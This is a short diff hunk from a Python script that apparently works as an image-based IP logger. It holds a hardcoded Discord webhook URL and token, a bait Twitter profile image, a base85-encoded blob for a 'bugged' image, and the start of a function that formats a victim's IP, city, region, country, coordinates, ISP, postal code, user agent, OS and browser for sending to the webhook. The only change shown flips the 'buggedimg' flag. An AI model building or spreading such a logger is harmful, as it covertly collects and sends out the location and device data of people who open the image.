@@ -5,7 +5,7 @@ import httpx, base64, httpagentparser
 webhook = 'https://discord.com/api/webhooks/1488525308234825823/lbvTtC4tR6J_Qjnbm5taBoqSBEp7pvIqoSWYhWGa9S8pK_CZ-BBYlQKYU1zoxHoWzD4m'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1709324213708873728/csXP2PM2_400x400.jpg').content
-buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
